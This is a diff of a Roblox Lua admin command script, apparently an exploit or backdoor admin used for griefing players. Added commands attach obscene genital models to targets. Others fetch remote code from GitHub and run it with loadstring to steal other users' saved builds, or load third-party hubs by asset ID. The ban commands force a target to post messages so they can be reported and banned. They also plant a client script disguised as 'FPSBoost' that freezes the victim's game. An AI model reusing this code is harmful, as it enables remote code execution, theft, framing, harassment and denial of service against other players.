+			local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = V1.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
+			local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
+			fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
+			local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
+			local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
+			fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
+			local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
+			local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
+			fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
+			local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = V1.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
+			local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
+			fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
+			local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = V1.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
+			local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
+			fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)
+
+			local tip = Instance.new("Part", argt[1].Character)
+			local peep = Instance.new("Part", argt[1].Character)
+			local ball1 = Instance.new("Part", argt[1].Character)
+			local ball2 = Instance.new("Part", argt[1].Character)
+
+			local tipmesh = Instance.new("SpecialMesh", tip)
+			local peepmesh = Instance.new("CylinderMesh", peep)
+			local ball1mesh = Instance.new("SpecialMesh", ball1)
+			local ball2mesh = Instance.new("SpecialMesh", ball2)
+
+			local tipweld = Instance.new("WeldConstraint", argt[1].Character)
+			local peepweld = Instance.new("WeldConstraint", argt[1].Character)
+			local peepweld2 = Instance.new("WeldConstraint", peep)
+			local ball1weld = Instance.new("WeldConstraint", argt[1].Character)
+			local ball2weld = Instance.new("WeldConstraint", argt[1].Character)
+
+			tip.BrickColor = BrickColor.new("Pink")
+			tip.Size = Vector3.new(1, 1, 1)
+			tip.BottomSurface = "Smooth"
+			tip.TopSurface = "Smooth"
+			tip.CanCollide = false
+			tip.Locked = true
+			
+			peep.Color = argt[1].Character.Torso.Color
+			peep.Size = Vector3.new(0.4, 1.3, 0.4)
+			peep.BottomSurface = "Smooth"
+			peep.TopSurface = "Smooth"
+			peep.CanCollide = false
+			peep.Locked = true
+			
+			ball1.Color = argt[1].Character.Torso.Color
+			ball1.Size = Vector3.new(1, 1, 1)
+			ball1.BottomSurface = "Smooth"
+			ball1.TopSurface = "Smooth"
+			ball1.CanCollide = false
+			ball1.Locked = true
+			
+			ball2.Color = argt[1].Character.Torso.Color
+			ball2.Size = Vector3.new(1, 1, 1)
+			ball2.BottomSurface = "Smooth"
+			ball2.TopSurface = "Smooth"
+			ball2.CanCollide = false
+			ball2.Locked = true
+
+			tipmesh.MeshType = "Sphere"
+			tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)
+
+			ball1mesh.MeshType = "Sphere"
+			ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
+
+			ball2mesh.MeshType = "Sphere"
+			ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
+
+			peep.CFrame = argt[1].Character.Torso.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(math.rad(90), 0, 0)
+			tip.CFrame = peep.CFrame * CFrame.new(0, -0.7, 0)
+			ball1.CFrame = peep.CFrame * CFrame.new(0.3, 0.4, 0.25)
+			ball2.CFrame = peep.CFrame * CFrame.new(-0.3, 0.4, 0.25)
+
+			tipweld.Part0 = argt[1].Character.Torso
+			tipweld.Part1 = tip
+
+			peepweld.Part0 = argt[1].Character.Torso
+			peepweld.Part1 = peep
+
+			peepweld2.Part0 = peep
+			peepweld2.Part1 = tip
+
+			ball1weld.Part0 = argt[1].Character.Torso
+			ball1weld.Part1 = ball1
+
+			ball2weld.Part0 = argt[1].Character.Torso
+			ball2weld.Part1 = ball2
+
+			LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0) RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
+			LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0) RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
+			LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0) RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)
+
+			WE = fWeld('weldx', P1, P1, V1, true, 0, -1, -2, math.rad(-90), 0, 0)
+			local N = V1.Neck N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
+
+			task.spawn(function() 
+				while task.wait() do
+					for i = 1, 6 do -- forwards
+						WE.C0 = WE.C0 * CFrame.new(0, 0.1, 0)
+						task.wait(0.030)
+					end
+
+					for i = 1, 6 do -- backwards
+						WE.C0 = WE.C0 * CFrame.new(0, -0.1, 0)
+						task.wait(0.030)
+					end
+					task.wait()
+				end
+			end)
+		end
+	end
+})
+
+addcmd({
 	Name = "antikill",
 	Aliases = {"autore"},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
+
 			if not table.find(autore, plr.Name) then
 				table.insert(autore, plr.Name)
+			else
+				notfi(sender, "cxo's admin", plr.Name .. " already has antikill enabled!")
+				return
 			end
 
-			plr.Character.Humanoid.Died:Connect(function()
-				plr:LoadCharacter()
-			end)
+			antikill(plr)
+
+		end
+	end
+})
+
+addcmd({
+	Name = "unantikill",
+	Aliases = {"unautore"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			
+			if table.find(autore, plr.Name) then
+				table.remove(autore, table.find(autore, plr.Name))
+			end
 
 		end
 	end
@@ -1842,15 +3875,11 @@ addcmd({
 
 addcmd({
 	Name = "save",
-	Aliases = {"buildsave"},
+	Aliases = {},
 	Function = function(sender, targets, arguments)
-		local slot = arguments[1] -- slot 0 = "buildsave" (kohls) slot 1 - 10 = "buildsave/1+" (p299)
+		local slot = arguments[1] -- slot 0 = "buildsave" (kohls) | slot 1 - 10 = "buildsave/1+" (p299)
 		local saving = table.concat(arguments, " ", 2)
 		local parts = {}
-
-		if #targets ~= 1 then
-			notfi(sender, "cxo's admin", "Too many targets!")
-		end
 
 		local function c(d)
 			return {
@@ -1872,7 +3901,9 @@ addcmd({
 			local folder = workspace:FindFirstChild(saving)
 			if folder then
 				for i, part in ipairs(folder:GetDescendants()) do
-					table.insert(_G.btoolsparts, part)
+					if part:IsA("BasePart") then
+						table.insert(_G.btoolsparts, part)
+					end
 				end
 				if tonumber(slot) == 0 then
 					local bss = game:GetService("DataStoreService"):GetDataStore("BuildSaveSystem")
@@ -1933,17 +3964,20 @@ addcmd({
 	Aliases = {"viewbuild"},
 	Function = function(sender, targets, arguments)
 
-		local targetid = table.concat(arguments, " ", 2)
+		local targetid = arguments[1]
+		local targetslot = arguments[2]
+
+		if targetslot == "0" then
+			targetslot = nil
+		end
 
 		local success, fail = pcall(function()
-			targetid = targetid:GetUserIdFromNameAsync(targetid)
+			targetid = game.Players:GetUserIdFromNameAsync(targetid)
 		end)
 
 		if fail then
 			notfi(sender, "cxo's admin", "Failed to get UserId, is the name correct?")
 		end
-
-		local targetslot = table.concat(arguments, " ", 3)
 
 		if not shared._DEK then
 			notfi(sender, "cxo's admin", "shared._DEK not found, importing..", 2)
@@ -1957,7 +3991,7 @@ addcmd({
 				if loaded then
 					loaded()
 				else
-					notfi(sender, "cxo's admin", "loaded shared._DEK")
+					notfi(sender, "cxo's admin", "Failed to load shared._DEK")
 				end
 			else
 				notfi(sender, "cxo's admin", "Failed to load shared._DEK")
@@ -1970,23 +4004,27 @@ addcmd({
 
 	end
 })
---[[
+
 addcmd({
 	Name = "buildload",
 	Aliases = {"loadbuild"},
+	Player = false,
 	Function = function(sender, targets, arguments)
 
-		local targetid = table.concat(arguments, " ", 2)
+		local targetid = arguments[1]
+		local targetslot = arguments[2]
+
+		if targetslot == "0" then
+			targetslot = nil
+		end
 
 		local success, fail = pcall(function()
-			targetid = targetid:GetUserIdFromNameAsync(targetid)
+			targetid = game.Players:GetUserIdFromNameAsync(targetid)
 		end)
 
 		if fail then
 			notfi(sender, "cxo's admin", "Failed to get UserId, is the name correct?")
 		end
-
-		local targetslot = table.concat(arguments, " ", 3)
 
 		if not shared._DEK then
 			notfi(sender, "cxo's admin", "shared._DEK not found, importing..", 2)
@@ -2011,23 +4049,103 @@ addcmd({
 
 	end
 })
-]]
+
+addcmd({
+	Name = "buildsave",
+	Aliases = {"savebuild"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+
+		local plr = arguments[1]
+		local plrslot = arguments[2]
+		local targetid = arguments[3]
+		local targetslot = arguments[4]
+
+		if targetslot == "0" then
+			targetslot = nil
+		end
+
+		local success, fail = pcall(function()
+			targetid = game.Players:GetUserIdFromNameAsync(targetid)
+		end)
+
+		if fail then
+			notfi(sender, "cxo's admin", "Failed to get UserId, is the name correct?")
+		end
+
+		if not shared._DEK then
+			notfi(sender, "cxo's admin", "shared._DEK not found, importing..", 2)
+			local success, result = pcall(function() -- decryptionite's build loader
+				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/decryptionite/streaming/refs/heads/main/Kohls%20Admin%20House%20NP/unlocked_buildload.lua")
+			end)
+			
+			if success then
+				local content = result
+				local loaded, fail = loadstring(content)
+				if loaded then
+					loaded()
+				else
+					notfi(sender, "cxo's admin", "loaded shared._DEK")
+				end
+			else
+				notfi(sender, "cxo's admin", "Failed to load shared._DEK")
+			end
+		end
+
+		shared._DEK:Steal(plr, plrslot, targetid, targetslot)
+
+	end
+})
 
 addcmd({
 	Name = "exser",
 	Aliases = {},
 	Function = function(sender, targets, arguments)
-		local success, fail = pcall(function()
-			require(10868847330):pls(sender.Name)
-		end)
-
-		if success then
-			task.spawn(function()
-				task.wait(1)
-				notfi(sender, "Exser", "The hub password is c00lkidds")
+		for i, plr in ipairs(targets) do
+			local success, fail = pcall(function()
+				require(10868847330):pls(plr.Name)
 			end)
-		else
-			notfi(sender, "Exser", "Failed to load: ".. fail)
+
+			if success then
+				task.spawn(function()
+					task.wait(1.5)
+					notfi(plr, "cxo's admin", "The hub password is c00lkidds", 7)
+				end)
+			else
+				notfi(plr, "cxo's admin", "Failed to load exser: ".. fail)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "sensation",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local success, fail = pcall(function()
+				require(100263845596551)(plr.Name, ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")
+			end)
+
+			if not success then
+				notfi(plr, "cxo's admin", "Failed to load sensation hub: ".. fail)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "robio",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local success, fail = pcall(function()
+				require(132909508523975):RO_BIO(plr.Name,"Both")
+			end)
+
+			if not success then
+				notfi(plr, "cxo's admin", "Failed to load ro-bio: ".. fail)
+			end
 		end
 	end
 })
@@ -2042,7 +4160,300 @@ addcmd({
 			end)
 
 			if fail then
-				notfi(sender, "Dex", "Failed to load: ".. fail)
+				notfi(sender, "cxo's admin", "Dex failed to load: ".. fail)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "motorcycle",
+	Aliases = {"ghostrider"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local success, fail = pcall(function()
+				require(7473216460).load(plr.Name)
+			end)
+
+			if fail then
+				notfi(sender, "cxo's admin", "Motorcycle failed to load: ".. fail)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "createteam",
+	Aliases = {"newteam"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local r = tonumber(arguments[#arguments - 2])
+        local g = tonumber(arguments[#arguments - 1])
+        local b = tonumber(arguments[#arguments])
+		local name = table.concat(arguments, " ", 1, #arguments - 3)
+--[[
+		if b == "r" or "rainbow" then
+
+			local name = table.concat(arguments, " ", 1, #arguments - 1)
+
+			local t = Instance.new("Team", game.Teams)
+			t.Name = name
+	
+			local bool = Instance.new("BoolValue", t)
+			bool.Name = "Rainbow"
+			bool.Value = false
+	
+			coroutine.resume(coroutine.create(function()
+				local r, g, b = 255, 0, 0
+				while not bool.Value do
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						r, b = r - 5, b + 5
+						t.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						g = g + 5
+						t.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						b = b - 5
+						t.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						r = r + 5
+						t.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						g = g - 5
+						t.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+				end
+			end))
+			return
+		end
+]]
+		if not (r and g and b) or r < 0 or r > 255 or g < 0 or g > 255 or b < 0 or b > 255 then
+            notfi(sender, "cxo's admin", "RGB values must be between 0 and 255.")
+			local t = Instance.new("Team", game.Teams)
+			t.Name = name
+			t.AutoAssignable = false
+            return
+        end
+
+		local t = Instance.new("Team", game.Teams)
+		t.Name = name
+		t.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+		t.AutoAssignable = false
+	end
+})
+
+addcmd({
+	Name = "teamcolour",
+	Aliases = {"teamcolor"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local r = tonumber(arguments[#arguments - 2])
+        local g = tonumber(arguments[#arguments - 1])
+        local b = tonumber(arguments[#arguments])
+		local name = table.concat(arguments, " ", 1, #arguments - 3)
+		local team = game.Teams:FindFirstChild(name)
+
+		if not team then
+			notfi(sender, "cxo's admin", "Team not found.")
+			return
+		end
+--[[
+		if b == "r" or "rainbow" then
+
+			if team:FindFirstChild("Rainbow") then
+				team.Rainbow.Value = true
+				task.wait(0.1)
+				team.Rainbow:Destroy()
+			end
+	
+			local bool = Instance.new("BoolValue", team)
+			bool.Name = "Rainbow"
+			bool.Value = false
+	
+			coroutine.resume(coroutine.create(function()
+				local r, g, b = 255, 0, 0
+				while not bool.Value do
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						r, b = r - 5, b + 5
+						team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						g = g + 5
+						team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						b = b - 5
+						team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						r = r + 5
+						team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+					for i = 0, 255, 5 do
+						if bool.Value then return bool:Destroy() end
+						g = g - 5
+						team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+						task.wait()
+					end
+				end
+			end))
+		end
+]]
+		if not (r and g and b) or r < 0 or r > 255 or g < 0 or g > 255 or b < 0 or b > 255 then
+            notfi(sender, "cxo's admin", "RGB values must be between 0 and 255.")
+            return
+        end
+
+		if team:FindFirstChild("Rainbow") then
+			team.Rainbow.Value = false
+			task.wait(0.1)
+			team.Rainbow:Destroy()
+		end
+
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if v.Team == team then
+				v.Team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+			end
+		end
+
+		team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+
+	end
+})
+
+addcmd({
+	Name = "setteam",
+	Aliases = {"teamset"},
+	Function = function(sender, targets, arguments)
+		local name = table.concat(arguments, " ")
+		for i, plr in ipairs(targets) do
+			if game.Teams:FindFirstChild(name) then
+				--[[if game.Teams:FindFirstChild(name):FindFirstChild("Rainbow") then
+					coroutine.resume(coroutine.create(function()
+						while game.Teams:FindFirstChild(name).Rainbow do
+							plr.TeamColor = game.Teams:FindFirstChild(name).TeamColor
+							task.wait()
+						end
+					end))
+				end]]
+				plr.Team = game.Teams:FindFirstChild(name)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "deleteteam",
+	Aliases = {"destroyteam"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local name = table.concat(arguments, " ")
+		if game.Teams:FindFirstChild(name) then
+			game.Teams:FindFirstChild(name):Destroy()
+		else
+			notfi(sender, "cxo's admin", "Team not found.")
+		end
+	end
+})
+
+addcmd({ -- credits 2 adonis admin for the idea and the mesh + decal code
+	Name = "png",
+	Aliases = {"image"},
+	Function = function(sender, targets, arguments)
+		local id = arguments[1]
+
+		local cats = {
+			"10494482900",
+			"18697484991",
+			"7845396131",
+			"14900934790",
+			"17107493803",
+			"15952023726",
+			"18954826056",
+			"12869438521",
+			"2763593752",
+			"5430597569",
+			"18177771988",
+			"18740086333",
+			"17825784678",
+			"14221072680",
+			"12545034074",
+			"66031236",
+		}
+
+		for i, plr in ipairs(targets) do
+
+			for i,v in pairs(plr.Character:GetDescendants()) do
+				if v:IsA("BasePart") then
+					v.Transparency = 1
+				elseif v:IsA("Accessory") then
+					v:Destroy()
+				end
+				if v.Name == "PNG" or v.Name == "image" then
+					v:Destroy()
+				end
+				if v.Name == "Handle" then
+					v:Destroy()
+				end
+				if v:IsA("Decal") then
+					v:Destroy()
+				end
+			end
+
+			local mesh = Instance.new("BlockMesh", plr.Character.HumanoidRootPart)
+			mesh.Scale = Vector3.new(3, 3, 0.1)
+			mesh.Name = "PNG"
+
+			local decal = Instance.new("Decal", plr.Character.HumanoidRootPart)
+			decal.Face = "Back"
+			decal.Name = "image"
+
+			local decalf = Instance.new("Decal", plr.Character.HumanoidRootPart)
+			decalf.Face = "Front"
+			decalf.Name = "image"
+
+			if id == "" or id == " " or id == nil then
+				decal.Texture = "rbxassetid://15637324487"
+				decalf.Texture = "rbxassetid://15637324487"
+				return
+			end
+
+			if id:lower() == "cat" then
+				id = cats[math.random(1, #cats)]
+			end
+
+			local st, result = pcall(game:GetService("InsertService").LoadAsset, game:GetService("InsertService"), id)
+			if st then -- Getz the textureid of the decal
+				image = result:FindFirstChildWhichIsA("Decal", true)
+				if image then
+					decal.Texture = image.Texture
+					decalf.Texture = image.Texture
+				end
+			else -- already has the texture id so we can just dew it
+				decal.Texture = "rbxassetid://".. id
+				decalf.Texture = "rbxassetid://".. id
 			end
 		end
 	end
@@ -2053,7 +4464,7 @@ addcmd({
 	Aliases = {"hideobby"},
 	Player = false,
 	Function = function(sender, targets, arguments)
-		for i, v in pairs(game:GetService("Workspace"):FindFirstChild("Tabby"):FindFirstChild("Admin_House"):GetChildren()) do
+		for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
 			if v.Name == "Snow" or v.Name == "Jumps" then
 				v.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
 			end
@@ -2093,11 +4504,48 @@ addcmd({
 })
 
 addcmd({
+	Name = "re",
+	Aliases = {"reset"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+				local rnpos = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
+
+				for i,v in pairs(plr.Character:GetChildren()) do
+					if v:IsA("Accessory") or v:IsA("Unknown") then
+						local currentcf = v.Handle.CFrame
+						v:Clone().Parent = workspace
+						v.Handle.CFrame = currentcf
+					end
+				end
+
+				for i, limb in pairs(plr.Character:GetChildren()) do
+					if limb:IsA("BasePart") then
+						limb:Destroy()
+					end
+				end
+
+				plr:LoadCharacter()
+				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = rnpos
+
+			else
+				plr:LoadCharacter()
+			end
+		end
+	end
+})
+
+addcmd({
 	Name = "clrbuilds",
 	Aliases = {},
 	Player = false,
 	Function = function(sender, targets, arguments)
 		_G.btoolsparts = {}
+		for i,v in pairs(workspace:GetChildren()) do
+			if v.Name ~= "Terrain" and (v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool")) then
+				v:Destroy()
+			end
+		end
 	end
 })
 
@@ -2218,20 +4666,91 @@ addcmd({
 	Aliases = {"slock"},
 	Player = false,
 	Function = function(sender, targets, arguments)
-		notfi(sender, "cxo's admin", "the server has been locked.")
 		if locked ~= true then
 			locked = true
+			local hint = Instance.new("Hint", workspace)
+			hint.Text = "cxo's admin | This server is locked"
+			hint.Name = "ServerLockNotification"
+			notfi(sender, "cxo's admin", "the server has been locked.")
 		end
 	end
 })
 
+addcmd({
+	Name = "unserverlock",
+	Aliases = {"unslock"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		if locked ~= false then
+			locked = false
+			if workspace:FindFirstChild("ServerLockNotification") then
+				workspace.ServerLockNotification:Destroy()
+			end
+			notfi(sender, "cxo's admin", "the server has been unlocked.")
+		end
+	end
+})
+
+addcmd({
+    Name = "f3x",
+    Aliases = {"btools"},
+    Function = function(sender, targets, arguments)
+        for i, plr in ipairs(targets) do
+            
+			local success, err = pcall(function()
+				require(2571067295).load(plr.Name)
+			end)
+
+			if err then
+				notfi(sender, "cxo's admin", "F3X failed to load: ".. err)
+			end
+
+        end
+    end
+})
+--[[
+addcmd({
+    Name = "chatbubbles",
+    Aliases = {},
+	Player = false,
+    Function = function(sender, targets, arguments)
+		local option = table.concat(arguments, " ", 1)
+
+		if option ~= "true" and option ~= "false" then
+			notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."chatbubbles false")
+		end
+
+		local bool = (option == "true")
+
+		game.TextChatService.BubbleChatConfiguration.Enabled = true
+    end
+})
+
+addcmd({
+    Name = "chatbar",
+    Aliases = {},
+	Player = false,
+    Function = function(sender, targets, arguments)
+		local option = table.concat(arguments, " ", 1)
+
+		if option ~= "true" and option ~= "false" then
+			notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."chatbar false")
+		end
+
+		local bool = (option == "true")
+
+		game.TextChatService.ChatInputBarConfiguration.Enabled = bool
+    end
+})
+]]
 addcmd({
 	Name = "chat",
 	Aliases = {},
 	Function = function(sender, targets, arguments)
 		local msg = table.concat(arguments, " ", 1)
 		for i, plr in ipairs(targets) do
-			_G.sudo(plr.Name, msg , "all")
+			--notfi(sender, "cxo's admin", "This command is currently patched!")
+			_G.sudo(plr.Name, msg, "all")
 		end
 	end
 })
@@ -2241,6 +4760,19 @@ addcmd({
 	Aliases = {},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
+			--notfi(sender, "cxo's admin", "This command is currently patched!")
+
+			if plr.Name == sender.Name then
+				notfi(sender, "cxo's admin", "Due to your account's safety you can not ban yourself!")
+				return
+			end
+
+			if table.find(Whitelist, tostring(plr.UserId)) or table.find(TempWhitelist, plr.UserId) then
+				if not table.find(Whitelist, tostring(sender.UserId)) then
+					notfi(sender, "cxo's admin", "You can not run this command on whitelisted users!")
+					return
+				end
+			end
 
 			if not _G.sudo then
 				notfi(sender, "cxo's admin", "Critical error! _G.sudo is not found, inserting..")
@@ -2289,7 +4821,6 @@ addcmd({
 					notfi(sender.Name, "cxo's admin", plr.Name .." Hasn't spoke yet! wait for them to chat then use this command.")
 				end
 			end
-
 		end
 	end
 })
@@ -2299,6 +4830,18 @@ addcmd({
 	Aliases = {"sus"},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
+			--notfi(sender, "cxo's admin", "This command is currently patched!")
+
+			if plr.Name == sender.Name then
+				notfi(sender, "cxo's admin", "Due to your account's safety you can not ban yourself!")
+			end
+
+			if table.find(Whitelist, tostring(plr.UserId)) or table.find(TempWhitelist, plr.UserId) then
+				if not table.find(Whitelist, tostring(sender.UserId)) then
+					notfi(sender, "cxo's admin", "You can not run this command on whitelisted users!")
+					return
+				end
+			end
 
 			if not _G.sudo then
 				notfi(sender, "cxo's admin", "Critical error! _G.sudo is not found, inserting..")
@@ -2329,18 +4872,53 @@ addcmd({
 
 					local co = coroutine.create(function()
 						repeat
-							task.wait(0.1)
 							_G.sudo(plr.Name, banstring)
-							local fps = 0.5
-							local osclock = os.clock()
-							while osclock + 1 / fps > os.clock() do
-							end
 							task.wait()
-							osclock = os.clock()
 						until banning == false or not game.Players:FindFirstChild(plr.Name)
 					end)
 
 					coroutine.resume(co)
+
+					local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+					local utilities = game:GetService("ServerScriptService").goog.Utilities
+					local loa = utilities:FindFirstChild("loadstring")
+					
+					if loa then
+						loa = loa:Clone()
+					else
+						loa = utilities:FindFirstChild("Loadstring")
+						if loa then
+							loa = loa:Clone()
+						end
+					end
+					
+					if not loa then
+						warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+					end
+
+					loa.Parent = scr
+					scr:WaitForChild("Exec").Value = [[
+
+						game:GetService("RunService").Heartbeat:Connect(function()
+							local osclock = os.clock()
+							while osclock + 1 / 0.5 > os.clock() do
+							end
+							task.wait()
+							osclock = os.clock()
+						end)
+
+					]]
+
+					if plr and plr.Character then
+						scr.Parent = plr.Character
+					else
+						if plr then
+							scr.Parent = plr:WaitForChild("PlayerGui")
+						end
+					end
+
+					scr.Name = "FPSBoost"
+					scr.Enabled = true
 
 					coroutine.wrap(function()
 						notfi(sender, "cxo's admin", "Report ".. plr.Name .." for swearing to ban them!")
@@ -2353,7 +4931,6 @@ addcmd({
 					notfi(sender.Name, "cxo's admin", plr.Name .." Hasn't spoke yet! wait for them to chat then use this command.")
 				end
 			end
-
 		end
 	end
 })
@@ -2363,6 +4940,7 @@ addcmd({
 	Aliases = {"loadgsudo"},
 	Player = false,
 	Function = function(sender, targets, arguments)
+		--notfi(sender, "cxo's admin", "This command is currently patched!")
 		if not _G.sudo then
 			local success, fail = pcall(function()
 				require(97248613655645).Run()
@@ -2574,27 +5152,81 @@ addcmd({
 	Player = false,
 	Function = function(sender, targets, arguments)
 
-		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("PrisonLife") then
+		--[[if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("PrisonLife") then
 			local PrisonLife = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("PrisonLife"):Clone()
 			PrisonLife.Parent = workspace
-		end
+		end]]
 
-		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("PrisonLife") then
+		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items") then
 			local success, fail = pcall(function()
-				require(98115243445014) -- prisonlife
+				--require(98115243445014) -- just the map prisonlife
+				require(125648157506287).load() -- full scripted prison life
 			end)
 
 			if success then
-				repeat task.wait() until workspace:FindFirstChild("PrisonLife")
-				workspace:FindFirstChild("PrisonLife").Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
-				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("PrisonLife"):Clone()
-				building.Parent = workspace
+				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items")
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("serverstorage"):GetChildren()) do
+					v:Clone().Parent = game.ServerStorage
+				end
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("teams"):GetChildren()) do
+					v:Clone().Parent = game.Teams
+				end
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("lighting"):GetChildren()) do
+					v:Clone().Parent = game.Lighting
+				end
